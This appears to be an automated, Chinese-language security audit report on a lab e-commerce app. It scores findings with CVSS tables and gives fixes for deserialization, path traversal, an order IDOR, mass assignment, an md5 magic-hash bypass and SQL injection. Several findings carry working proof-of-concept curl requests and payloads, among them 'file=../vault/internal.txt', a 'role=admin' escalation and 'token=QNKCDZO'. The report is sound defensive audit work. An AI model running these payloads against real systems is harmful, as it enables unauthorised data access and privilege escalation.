# 宿主阶段审计报告

运行：`7f00e97c923049fc97126660fc336eea`
状态：inconclusive；完整性：未完成
停止原因：一次修复规划后阻塞原因仍未改变，停止重复规划。

运行发现原始记录：46；当前有效记录：46；按台账身份分组：25

## 当前有效发现

### 台账 `4fb4a3ddd99d44a9ad7e1ce08c9feb6d`

- 会员备份恢复对客户端数据不安全反序列化（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `c5c10ca9e3a14c0c8ed977e9ce80783b` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/backup.php', 'start_line': 4, 'end_line': 6}, {'path': 'lab30-shop/app/src/backup.php', 'start_line': 2, 'end_line': 5}]
  结论：backup.php 接收 POST backup，base64_decode 后直接 unserialize(raw)，仅检查 instanceof MemberBackup 即构造对象并用其 tier/displayName 更新用户。MemberBackup 无 __wakeup/__unserialize 或 allowed_classes 限制，反序列化可控对象属性可影响写入状态，属不安全反序列化。
  输入：POST backup 字段，base64 编码序列化字符串
  传播：base64_decode -> unserialize -> instanceof 检查 -> UPDATE users SET tier,display_name
  危险操作：unserialize 客户端可控数据并据此更新用户状态
  保护：仅 instanceof MemberBackup 校验；无 allowed_classes 白名单、无签名/HMAC；CSRF 存在但不阻止内容伪造
  前提：['已登录用户（require_user），通过 CSRF 校验后提交']
  修复建议：避免 unserialize 客户端数据，改用 JSON；如必须反序列化则使用 allowed_classes 白名单并对数据签名。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:11:11.238651+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 入口 | lab30-shop/app/public/account/backup.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 提交构造的 base64 序列化数据即可 | lab30-shop/app/public/account/backup.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录用户 | lab30-shop/app/public/account/backup.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身提交 | lab30-shop/app/public/account/backup.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响当前用户记录 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 未证明读取敏感数据 | lab30-shop/app/public/account/backup.php:5-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可写用户 tier/displayName | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据 | lab30-shop/app/public/account/backup.php:5-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `c483a01ea3c0410590a2f339dde72e65`

- 帮助文档下载参数可路径遍历读取任意文件（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `801d4c6836914b979e73bdbdf4741a48` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/download.php', 'start_line': 3, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 9, 'end_line': 9}]
  结论：support/download.php 将 $_GET['file'] 直接拼接到 data_dir().'/docs/' 后 is_file 并 file_get_contents 输出，未使用 basename 或 realpath 目录约束，可用 ../ 逃逸 docs 目录读取会话/vault 等文件。
  输入：GET file 参数
  传播：$_GET['file'] -> data_dir().'/docs/'.$file -> is_file -> file_get_contents -> 响应输出
  危险操作：file_get_contents 读取拼接路径文件并回显
  保护：仅 require_user 登录校验与 is_file 存在性检查；无 basename/realpath/白名单
  前提：['已登录用户，目标文件存在且可读']
  修复建议：使用 basename 限制文件名，或以 realpath 校验结果仍位于 docs 目录内。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:11:11.241248+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 入口 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 使用 ../ 即可逃逸 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录用户 | lab30-shop/app/public/support/download.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行请求 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 读取同主机文件 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取 vault/internal.txt 等敏感文件内容 | lab30-shop/app/src/setup.php:34-34 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读取 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏证据 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `4e35ce72f856430faf590095346c382a`

- 订单详情缺失归属校验，可读取任意他人订单（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `a8914cd923c545d98e1286b57deb4247` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/detail.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：orders/detail.php 第2行仅调用 require_user() 确认登录，随后用 $_GET['id'] 直接查询订单并 JOIN 用户/商品表，SQL 未附加 user_id 过滤条件；第4行将 order_no、username、quantity、total、private_note 全部输出。攻击者登录后遍历 id 即可读取任意他人订单详情，包含私密备注，缺失归属校验。
  输入：GET 参数 id
  传播：require_user() 返回用户对象但未参与查询条件；$_GET['id'] 直接绑定到 WHERE o.id=?
  危险操作：SELECT o.*,u.username,p.name FROM orders ... WHERE o.id=? 后渲染私密备注
  保护：仅登录鉴权，无订单归属（user_id）校验
  前提：['攻击者拥有普通登录会话，且目标订单 id 存在']
  修复建议：查询订单时追加 AND o.user_id=? 并绑定 $u['id']，或查询后严格比较 $o['user_id']===$u['id']，不匹配返回 404。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:12:49.758276+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 入口可达 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需修改 id 参数 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录为普通用户 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仅越权读取他人订单数据 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 泄露他人订单金额与私密备注 | lab30-shop/app/public/orders/detail.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读查询 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏性操作 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'orders_idor.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=<attacker-session>' 'http://target/orders/detail.php?id=1'", 'instructions': '用普通用户登录取得会话 Cookie，遍历 id=1..N 请求详情，对比返回的购买人/金额/备注。', 'normal_input': 'id=自己的订单 id', 'attack_input': 'id=1（他人订单）', 'expected_result': '普通用户自己的 id 返回本人订单；换成他人 id 仍返回对方 order_no、username、total 和 private_note。'}
````


### 台账 `0fee004aaf334840989e82b5a3a2a1f0`

- 资料维护列白名单包含 role/balance/tier，可自提权限与余额（CVSS 3.1 Base 8.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N，验证：unverified）
  来源 `5bdefd2903bf4024b9f6227aa1bd956a` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/update.php', 'start_line': 1, 'end_line': 9}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 20, 'end_line': 25}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：update.php 第4行列白名单包含 display_name、email、role、balance、tier、nickname、homepage；第5行遍历所有 POST 键，命中即拼接进 UPDATE 的 SET 子句；第6行仅以当前用户 id 作为 WHERE 条件。普通用户可 POST role=admin、balance=99999、tier=gold 完成提权与余额篡改。虽有 check_csrf 与登录校验，但不限制敏感列，属 mass_assignment。
  输入：POST 字段 role/balance/tier 等（受 CSRF 令牌保护，但普通用户可自行获取令牌）
  传播：$_POST 键命中 $columns 白名单 -> $set/$values -> UPDATE users SET ... WHERE id=$u['id']
  危险操作：UPDATE users SET role=?, balance=?, tier=?... WHERE id=?
  保护：check_csrf() 与登录校验；错误地允许 role/balance/tier 列
  前提：['普通用户已登录并能获取自身 CSRF 令牌']
  修复建议：移除 role/balance/tier 等敏感列，仅允许 display_name/nickname/email/homepage，并对敏感变更只允许后台受控路径与角色校验。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:12:49.759443+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 入口可达 | lab30-shop/app/public/account/update.php:2-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 POST 字段即可 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需普通登录用户 | lab30-shop/app/public/account/update.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 本人操作即可 | lab30-shop/app/public/account/update.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同一账户权限模型内提升自身权限 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可设置 role=admin 获得运营/管理访问 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可修改 balance/tier 等敏感字段 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏性删除操作 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'mass_assignment.sh', 'language': 'bash', 'script': 'csrf=$(curl -s -b \'SHOPSESSID=<sess>\' http://target/account/update.php | grep -o \'name="csrf" value="[^"]*\' | cut -d\'"\' -f4); curl -s -b \'SHOPSESSID=<sess>\' -d "csrf=$csrf&role=admin&balance=99999&tier=gold" http://target/account/update.php', 'instructions': '登录普通用户，提取页面中 csrf 值，POST role/balance/tier 后访问 /account/me.php 或 /ops/index.php 验证权限。', 'normal_input': 'csrf=<token>&display_name=新名字', 'attack_input': 'csrf=<token>&role=admin&balance=99999&tier=gold', 'expected_result': '普通输入仅改显示名；攻击输入后 me.php 返回 role=admin、balance=99999、tier=gold，运营入口可访问。'}
````

- 资料维护白名单含 role/balance/tier 导致自助提权与余额篡改（CVSS 3.1 Base 8.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N，验证：unverified）
  来源 `791e51620a0242a49fcde8dbbf9c4e58` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/update.php', 'start_line': 2, 'end_line': 6}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：update.php:4 白名单包含 role、balance、tier，第 5-6 行将任意 POST 键拼接进 UPDATE users SET ... WHERE id=?，攻击者可提交 role=admin 或篡改 balance 完成自助提权。
  输入：POST 参数 role/balance/tier
  传播：$_POST 键在白名单 -> $set 拼接 -> UPDATE users SET role=?,balance=?,tier=? WHERE id=$u['id']
  危险操作：修改用户 role 与 balance
  保护：无字段角色限制，仅 CSRF 校验
  前提：['已登录普通用户，提交含 csrf 的表单']
  修复建议：从白名单移除 role/balance/tier，仅允许非敏感资料字段，并按字段做服务端权限校验。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:15:46.272585+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 表单 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接提交字段 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 仅登录 | lab30-shop/app/public/account/update.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 自助提交 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 改自身账户 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可改 role 获得 admin/operator 权限 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可改 balance/tier | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无删除破坏 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `c0535f794e7440d5ab8f32a917a93d02`

- support/download.php 文件参数未规范化，可目录遍历读取 data_dir 内任意文件（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `7f1b342c18fa408eb0e2bd723b921bbf` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/download.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 9, 'end_line': 9}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 31, 'end_line': 38}]
  结论：download.php 直接使用 $_GET['file'] 拼接 data_dir().'/docs/'，未调用 basename/realpath 校验，仅 is_file 存在性检查后 file_get_contents 并输出。会话用户可请求 ../vault/internal.txt 或 ../vault/account.php，逃逸出 docs 目录读取同数据根下的内部文件。
  输入：GET 参数 file
  传播：$_GET['file'] -> $path = data_dir().'/docs/'.file -> is_file -> file_get_contents -> echo
  危险操作：file_get_contents 任意路径读取并回显
  保护：仅有 require_user() 登录检查与 is_file；无 basename/realpath/目录白名单
  前提：["攻击者拥有任意登录账户；data_dir()('/var/lib/shop') 下存在 docs 及 vault 目录"]
  修复建议：使用 basename() 仅保留文件名，或对 realpath 结果检查前缀是否为 data_dir().'/docs/'。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:13:32.319975+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 入口可远程访问 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 file=../vault/internal.txt 即可 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user() 要求登录账户 | lab30-shop/app/public/support/download.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人参与 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 读取同进程文件系统内容，不改变授权边界 | lab30-shop/app/src/bootstrap.php:9-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取 vault 内部标记等文件内容并回显 | lab30-shop/app/src/setup.php:34-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读 file_get_contents，无写入 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 不修改或删除数据 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'download_traversal.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=<valid_session>' 'http://target/support/download.php?file=../vault/internal.txt'", 'instructions': '先登录获取会话 Cookie，将 target 替换为站点地址，发送上述请求。', 'normal_input': '?file=shipping.txt', 'attack_input': '?file=../vault/internal.txt', 'expected_result': '正常请求返回配送说明；攻击请求返回 SHOP_INTERNAL_ 标记内容。'}
````


### 台账 `0c170552610e4a89be242287cce6e96c`

- backup.php 对用户提交的 base64 数据无类型白名单反序列化（CVSS 3.1 待评分，验证：unverified）
  来源 `46c0555b2ad449c493861cfccc886df4` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/backup.php', 'start_line': 2, 'end_line': 6}, {'path': 'lab30-shop/app/src/backup.php', 'start_line': 1, 'end_line': 5}]
  结论：backup.php 第4-5行 base64_decode 后直接 unserialize 用户 POST 的 backup 值，未传 allowed_classes；随后第6行将 $restored->tier/$restored->displayName 写入当前用户。外部输入可构造任意类序列化数据进入反序列化对象创建流程；是否进一步触发魔术方法需快照中其它类定义证明。
  输入：POST 参数 backup
  传播：$_POST['backup'] -> base64_decode -> unserialize -> instanceof MemberBackup -> UPDATE users SET tier,display_name
  危险操作：unserialize 外部数据；随后更新用户 tier/display_name
  保护：有 check_csrf() 与 instanceof MemberBackup 类型判断，但 unserialize 本身未限定 allowed_classes
  前提：['攻击者已登录并获取 CSRF token']
  修复建议：unserialize($raw, ['allowed_classes' => [MemberBackup::class]]) 或改用 JSON。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:13:32.321137+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP POST 入口 | lab30-shop/app/public/account/backup.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需构造序列化对象，且未见可用 gadget | lab30-shop/app/public/account/backup.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user() 登录即可 | lab30-shop/app/public/account/backup.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人参与 | lab30-shop/app/public/account/backup.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 进程内 unserialize | lab30-shop/app/public/account/backup.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | 待补充 | 缺少 gadget 链证据，无法确认影响 | lab30-shop/app/src/backup.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | 指标待补充 |
| I | L | 还原对象属性可被写入当前用户 tier/display_name（如 tier 值），但仅限自身记录 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | 待补充 | 未见导致进程/数据不可用的证据 | lab30-shop/app/src/backup.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | 指标待补充 |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `8e164fa571374cf5a0993783d6eb6c3d`

- 会员备份恢复反序列化客户端对象导致会员等级自提升（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `e69e4ebe7f7a492cb85181d88343b72d` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/backup.php', 'start_line': 2, 'end_line': 6}, {'path': 'lab30-shop/app/src/backup.php', 'start_line': 2, 'end_line': 5}]
  结论：backup.php 第4行将用户提交的 backup 字段 base64 解码，第5行直接 unserialize 且只检查 instanceof MemberBackup；第6行把反序列化对象的 tier/displayName 写入当前用户记录。MemberBackup 的 public 属性可由客户端控管，故攻击者可把 tier 设为 gold 实现会员等级自提升。
  输入：POST backup（base64 序列化 MemberBackup，tier=gold）
  传播：$_POST['backup'] -> base64_decode -> unserialize -> $restored->tier/displayName -> UPDATE users
  危险操作：unserialize 后写入权限字段 tier
  保护：仅有 instanceof MemberBackup 类型检查与 CSRF 校验；无签名/HMAC，无属性白名单，无 tier 枚举限制
  前提：['已登录普通用户，取得自身会话的 CSRF token']
  修复建议：改用 JSON 或带 HMAC 签名的备份格式；恢复时仅允许白名单字段，tier 不在客户端可恢复字段内。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:14:45.961442+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 入口可远程访问 | lab30-shop/app/public/account/backup.php:1-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 base64(serialize(MemberBackup)) 即可，代码无格式秘密 | lab30-shop/app/public/account/backup.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 仅需普通登录用户自身会话 | lab30-shop/app/public/account/backup.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者提交自身 POST 与页面 token | lab30-shop/app/public/account/backup.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍限于同用户记录更新 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 无直接读取 | lab30-shop/app/public/account/backup.php:5-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可修改自身 tier 与 display_name | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'backup_restore_deserialization_poc.php', 'language': 'php', 'script': '<?php\n// 生成 serialized MemberBackup，tier=gold\nclass MemberBackup { public string $tier = \'gold\'; public string $displayName = \'pwned\'; }\n$payload = base64_encode(serialize(new MemberBackup()));\necho $payload, "\\n";\n', 'instructions': '登录普通账号，打开 /account/backup.php 获取 csrf token，将脚本输出的 backup 值作为 POST backup 字段连同 csrf 提交。', 'normal_input': '恢复一个 tier=standard 的正常备份', 'attack_input': 'base64(O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:5:"pwned";})', 'expected_result': '攻击请求后 users.tier 变为 gold 并显示“会员备份已恢复”，而正常输入保持 standard。'}
````


### 台账 `e0cf553e9838411fa31a2455b8d0dd8d`

- 兑换码 md5 松散比较可用魔术哈希绕过并升级金卡（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `80e534a34012491a8410b06da6a53896` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/redeem.php', 'start_line': 2, 'end_line': 6}]
  结论：redeem.php 第4行计算 md5('240610708')，第5行对用户 POST token 的 md5 与哈希做 == 松散比较。PHP 中双方均为 '0e' 前缀的 md5 字符串时按数值 0 比较相等，攻击者提交 md5 也为 0e 开头的字符串即可通过并把当前用户 tier 更新为 gold。
  输入：POST token
  传播：$_POST['token'] -> md5() -> == $secret_hash -> UPDATE users SET tier='gold'
  危险操作：基于弱比较的兑换码校验后更新会员等级
  保护：仅 check_csrf；使用 == 而非 hash_equals，且兑换码为常量
  前提：['已登录用户，取得自身 CSRF token']
  修复建议：改用 hash_equals 与带随机盐/服务端存储的兑换码；避免 md5 作为口令校验。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:14:45.962815+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP POST 可远程触发 | lab30-shop/app/public/account/redeem.php:1-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 使用已知 0e 魔术哈希即可，无需真实兑换码 | lab30-shop/app/public/account/redeem.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 普通登录用户即可 | lab30-shop/app/public/account/redeem.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身提交 | lab30-shop/app/public/account/redeem.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仅更新自身 tier | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 无读取影响 | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 把自身 tier 升级为 gold | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据 | lab30-shop/app/public/account/redeem.php:5-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'redeem_magic_hash_poc.php', 'language': 'php', 'script': "<?php\n// 真实漏洞需服务端运行 PHP；此处仅演示 0e 松散比较\n$secret = md5('240610708');\nvar_dump($secret == md5('QNKCDZO'));\n", 'instructions': '登录后向 /account/redeem.php POST token=QNKCDZO 并携带页面 csrf；响应 accepted=true 且账户 tier 变为 gold。', 'normal_input': 'token=invalid', 'attack_input': 'token=QNKCDZO', 'expected_result': '正常输入返回 422 兑换码无效；QNKCDZO 返回 200 accepted=true 并升级 gold。'}
````


### 台账 `a61dde40538748f4829bb7ba5bb0d43c`

- 会员查询接口将 $_GET['q'] 直接拼接进 LIKE 子句导致 SQL 注入（CVSS 3.1 待评分，验证：unverified）
  来源 `052bafd14f804b25a7dc75f3a2304c61` / 修订 1
  证据：[{'path': 'lab30-shop/app/src/member_lookup.php', 'start_line': 3, 'end_line': 3}, {'path': 'lab30-shop/app/public/ops/members.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/public/ops/members.php', 'start_line': 3, 'end_line': 3}]
  结论：member_lookup() 把字符串参数直接拼接到 SQL 的 LIKE 模式中，调用方传入未经处理的 $_GET['q']，无 prepared statement 或转义，可注入任意 SQL 表达式读取数据库。
  输入：$_GET['q']（ops/members.php:2）
  传播：$term -> member_lookup($term) -> db()->query 拼接字符串 -> fetchAll
  危险操作：db()->query("SELECT id,username,email,role FROM users WHERE username LIKE '%" . $term . "%'")
  保护：无；PDO::query 不支持绑定，参数未转义
  前提：['攻击者需持有 operator 或 admin 角色会话']
